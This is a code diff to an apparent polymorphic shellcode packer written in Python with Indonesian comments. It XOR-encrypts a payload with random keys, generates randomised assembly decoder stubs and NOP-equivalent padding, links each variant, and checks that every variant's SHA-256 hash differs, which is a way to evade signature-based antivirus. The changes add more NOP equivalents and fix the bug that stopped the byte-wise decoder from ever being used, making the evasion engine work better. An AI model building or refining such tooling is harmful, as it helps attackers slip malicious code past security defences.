@@ -34,6 +34,8 @@ NOP_POOL = [
     "nop",
     "xchg %ax,%ax",
     "movq %r10,%r10",
+    "nopw 0(%rax,%rax,1)",
+    "leaq 0(%r10),%r10",
 ]
 
 INIT_SRC = [
@@ -75,9 +77,10 @@ def gen_nop_sled(rng, depth=0):
 
 def build_stub(rng, enc_bytes, key_bytes, qword):
     src, key, cnt = rng.sample(REG_POOL, 3)
-    body_style = rng.choice(["byte", "byte", "qword"])  # byte lebih sering
-    if qword:
-        body_style = "qword"
+    # Hormati pilihan pemanggil: qword hanya sah bila payload sudah kelipatan
+    # 8 (lihat main()). Mengacak ulang di sini membuat body qword dipakai pada
+    # panjang non-kelipatan-8 dan hasil dekripsi salah.
+    body_style = "qword" if qword else "byte"
     body = rng.choice(BODY_QWORD if body_style == "qword" else BODY_BYTE)
     decr = rng.choice(DECR_LOOP).format(cnt=cnt)
     jmp = rng.choice(JUMP_ENC)
@@ -141,17 +144,22 @@ def main():
     if not payload:
         sys.exit("payload kosong")
 
-    # padding ke kelipatan 8 (biar body qword bisa dipakai kapan saja)
-    if len(payload) % 8:
-        payload += b"\x90" * (8 - len(payload) % 8)
-
     rng = random.Random(args.seed)
 
     hashes = []
+    styles = []
     for i in range(1, args.variants + 1):
-        key = bytes(rng.randrange(256) for _ in range(len(payload)))
-        enc = bytes(p ^ k for p, k in zip(payload, key))
-        stub = build_stub(rng, enc, key, qword=(len(payload) % 8 == 0))
+        # Body qword membutuhkan panjang kelipatan 8; body byte tidak. Pilih
+        # mode DULU, baru padding — versi lama mem-padding lebih awal sehingga
+        # kondisi qword selalu benar dan body byte tidak pernah dipakai.
+        use_qword = rng.choice([True, False])
+        body = bytearray(payload)
+        if use_qword and len(body) % 8:
+            body += b"\x90" * (-len(body) % 8)
+
+        key = bytes(rng.randrange(256) for _ in range(len(body)))
+        enc = bytes(p ^ k for p, k in zip(body, key))
+        stub = build_stub(rng, enc, key, qword=use_qword)
 
         out_path = f"{args.out}_{i}"
         with tempfile.TemporaryDirectory() as td:
@@ -162,10 +170,11 @@ def main():
             try:
                 subprocess.run(["as", asm, "-o", obj], check=True)
             except subprocess.CalledProcessError:
-                # simpan stub yang gagal untuk debug
-                with open("morph_debug.s", "w") as f:
+                # simpan stub yang gagal untuk debug (jangan kotori repo)
+                dbg = os.path.join(os.getcwd(), f"morph_debug_{i}.s")
+                with open(dbg, "w") as f:
                     f.write(stub)
-                print(f"stub gagal disimpan ke morph_debug.s (variant {i})")
+                print(f"stub gagal disimpan ke {dbg} (variant {i})")
                 raise
             subprocess.run(
                 ["ld", "-nostdlib", "-o", out_path, obj], check=True
@@ -173,10 +182,12 @@ def main():
 
         h = hashlib.sha256(open(out_path, "rb").read()).hexdigest()
         hashes.append(h)
-        print(f"variant {i}: {out_path}  sha256={h[:16]}...  (body={ 'qword' if len(payload)%8==0 and 'qword' in stub else 'byte' })")
+        styles.append("qword" if use_qword else "byte")
+        print(f"variant {i}: {out_path}  sha256={h[:16]}...  (body={styles[-1]})")
 
     uniq = len(set(hashes))
-    print(f"\n{len(hashes)} varian, {uniq} hash unik")
+    print(f"\n{len(hashes)} varian, {uniq} hash unik "
+          f"(body: {styles.count('qword')} qword, {styles.count('byte')} byte)")
     if uniq < len(hashes):
         print("PERINGATAN: ada hash yang sama (seharusnya semua beda)")
 
